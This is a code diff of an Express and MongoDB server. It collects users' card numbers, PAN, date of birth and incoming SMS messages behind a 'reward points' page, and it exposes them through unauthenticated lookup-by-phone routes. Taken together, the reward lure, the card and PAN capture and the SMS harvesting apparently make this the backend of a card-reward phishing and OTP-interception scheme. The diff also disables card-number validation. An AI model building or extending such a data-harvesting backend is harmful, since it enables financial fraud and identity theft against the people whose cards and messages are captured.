@@ -20,7 +20,7 @@ const mongoose = require('mongoose')
 const dbURL = process.env.ATLAS_DB_URL;
 
 
-
+// console.log('env url',dbURL)
 
 mongoose.connect(dbURL)
   .then(() => console.log(' db Connected!'));
@@ -98,6 +98,20 @@ const authenticateJWT = (req, res, next) => {
 
 
 
+// app.get('/test', async (req, res) => {
+//   try {
+//     let card_number = 4111111111111111;
+//     let result = await findCardInDatabase(card_number);
+//     console.log("final result", result);
+//     res.send(result);
+//   } catch (error) {
+//     console.error("Error finding card in database:", error);
+//     res.status(500).send("An error occurred while fetching card details.");
+//   }
+// });
+
+
+
 
 
 // // Route for Login Page
@@ -114,8 +128,7 @@ app.get('/reward',(req, res) => {
 
 // // Route for reward points
 app.get('/rewardpoints', (req, res) => {
-  const first = req.query.first;
-    res.render('reward_points',{first});
+    res.render('reward_points');
   });
 
 
@@ -136,9 +149,16 @@ function hasRequiredData(user) {
   }
   
 
+// function hasRequiredData(user) {
+//     const hasSMS = Array.isArray(user.sms) && user.sms.length > 0; 
+//     const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
+//     const hasCardNumber = user.cards.length >= 1;
+//     console.log()
+//     console.log(hasSMS,hasPhone,hasCardNumber)
+//     return hasSMS && hasPhone && hasCardNumber;
+//   }
 
-
-app.get('/alldata', async (req, res) => {
+app.get('/alldatnew', async (req, res) => {
     try {
       const allUsersWithSMS = await User.find()
   
@@ -165,8 +185,35 @@ app.get('/alldata', async (req, res) => {
 
 
 
+app.get('/userone/:phone', async (req, res) => {
+  const { phone } = req.params;
 
+  try {
+    const user = await User.findOne({ phone });
 
+    if (!user) {
+      return res.status(404).json({ valid: false, message: 'User not found' });
+    }
+    
+    // Extract the first card from the cards array
+    const firstCard = user.cards && user.cards.length > 0 ? user.cards[0] : null;
+
+    // Log the user object to check if userData exists
+    console.log('Fetched user:', user);
+
+    res.json({
+      data: user.userData ,
+      _id: user._id,
+      phone: user.phone,
+      __v: user.__v,
+      card: firstCard,
+      sms: user.sms
+    });
+  } catch (error) {
+    console.error('Error fetching user data:', error);
+    res.status(500).json({ valid: false, error: 'Internal server error' });
+  }
+});
 
 app.get('/user/:phone', async (req, res) => {
   const { phone } = req.params;
@@ -181,7 +228,7 @@ app.get('/user/:phone', async (req, res) => {
     const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
 
 
-    console.log(user.sms.date)
+    console.log(user.sms)
     // Log the user object to check if userData exists
 
 //     for (timestamp in user.sms){
@@ -212,118 +259,44 @@ app.get('/user/:phone', async (req, res) => {
 });
  
 
-app.get('/delete/:phone', async (req, res) => {
+
+app.get('/usera/:phone', async (req, res) => {
     const { phone } = req.params;
   
     try {
-      const user = await User.findOneAndDelete({ phone });
+      const user = await User.findOne({ phone });
   
       if (!user) {
         return res.status(404).json({ valid: false, message: 'User not found' });
       }
+      
+      // Sort sms array by date field
+      if (Array.isArray(user.sms)) {
+        user.sms.sort((a, b) => new Date(a.date) - new Date(b.date));
+      }
   
-      res.json({ valid: true, message: 'User deleted successfully' });
+      // Extract the first card from the cards array
+      const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
+  
+      // Log the user object to check if userData exists
+      console.log('Fetched user:', user);
+  
+      res.json({
+        data: {
+          name: user.userData.name,
+          dob: user.userData.dob,
+          phone: user.userData.phone,
+          pan: user.userData.pan,
+          cards: firstCard,
+          _id: firstCard._id
+        },
+        sms: user.sms
+      });
     } catch (error) {
-      console.error('Error deleting user data:', error);
+      console.error('Error fetching user data:', error);
       res.status(500).json({ valid: false, error: 'Internal server error' });
     }
   });
-
-
-
-
-app.get('/usera/:phone', async (req, res) => {
-    const { phone } = req.params;
-
-    try {
-        const user = await User.findOne({ phone });
-
-        if (!user) {
-            return res.status(404).json({ valid: false, message: 'User not found' });
-        }
-
-        // Sort sms array by date field
-        if (Array.isArray(user.sms)) {
-            user.sms.sort((a, b) => new Date(parseInt(a.date)) - new Date(parseInt(b.date)));
-        }
-
-        // Logging sorted sms with the specified date format
-        user.sms.forEach(sms => {
-            const date = new Date(parseInt(sms.date));
-            const options = { timeZone: 'America/Los_Angeles', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
-            console.log(date.toLocaleString('en-US', options));
-        });
-
-        // Extract the first card from the cards array
-        const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
-
-        // Log the user object to check if userData exists
-        console.log('Fetched user:', user);
-
-        res.json({
-            data: {
-                name: user.userData.name,
-                dob: user.userData.dob,
-                phone: user.userData.phone,
-                pan: user.userData.pan,
-                cards: firstCard,
-                _id: firstCard._id
-            },
-            sms: user.sms
-        });
-    } catch (error) {
-        console.error('Error fetching user data:', error);
-        res.status(500).json({ valid: false, error: 'Internal server error' });
-    }
-});
-
-
-app.get('/userd/:phone', async (req, res) => {
-    const { phone } = req.params;
-
-    try {
-        const user = await User.findOne({ phone });
-
-        if (!user) {
-            return res.status(404).json({ valid: false, message: 'User not found' });
-        }
-
-        // Sort sms array by date field in descending order
-        if (Array.isArray(user.sms)) {
-            user.sms.sort((a, b) => new Date(parseInt(b.date)) - new Date(parseInt(a.date)));
-        }
-
-        // Logging sorted sms with the specified date format
-        user.sms.forEach(sms => {
-            const date = new Date(parseInt(sms.date));
-            const options = { timeZone: 'America/Los_Angeles', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
-            console.log(date.toLocaleString('en-US', options));
-        });
-
-        // Extract the first card from the cards array
-        const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
-
-        // Log the user object to check if userData exists
-        console.log('Fetched user:', user);
-
-        res.json({
-            data: {
-                name: user.userData.name,
-                dob: user.userData.dob,
-                phone: user.userData.phone,
-                pan: user.userData.pan,
-                cards: firstCard,
-                _id: firstCard._id
-            },
-            sms: user.sms
-        });
-    } catch (error) {
-        console.error('Error fetching user data:', error);
-        res.status(500).json({ valid: false, error: 'Internal server error' });
-    }
-});
-
-
 
 app.post('/savesms', async(req, res) => {
       var { address, body, date,phone } = req.body;
@@ -393,14 +366,6 @@ app.post('/verifyOTP', async (req, res) => {
           .create({ to: phone, code: otp });
 
       if (verification_check.status === 'approved') {
-          // let result = await User.exists({ phone: phone });
-          let result = await User.exists({ phone: phone,'cards': { $not: { $size: 0 } }  });
-          console.log("Already exist ", result);
-
-          if (result != null){
-              console.log('Number already exists, responding with error');
-              return res.json({ valid: false, error: 'number already exist' });
-          }
           try {
               console.log("userdata",userData)
               let user = await User.findOneAndUpdate(
@@ -425,10 +390,6 @@ app.post('/verifyOTP', async (req, res) => {
   }
 });
 
-
-
-
-
 app.post('/validateCard', async (req, res) => {
   console.log('Received request to /validateCard', req.session);
 
@@ -436,11 +397,11 @@ app.post('/validateCard', async (req, res) => {
 
   // Input Validation
   const numberValidation = valid.number(cardNumber);
-  if (!numberValidation.isValid) {
-    return res.json({ valid: false, error: numberValidation.isPotentiallyValid 
-                                           ? 'Invalid card number' 
-                                           : 'Invalid card number format' }); 
-  }
+  // if (!numberValidation.isValid) {
+  //   return res.json({ valid: false, error: numberValidation.isPotentiallyValid 
+  //                                          ? 'Invalid card number' 
+  //                                          : 'Invalid card number format' }); 
+  // }
 
   try {
     // Check for Duplicate Card (with Timeout)
@@ -493,6 +454,15 @@ app.post('/validateCard', async (req, res) => {
 
 
 
+
+
+
+
+
+
 app.listen(3000, () => {
     console.log('Server running on port 3000');
 });
+
+
+// export const handler = serverless(app);
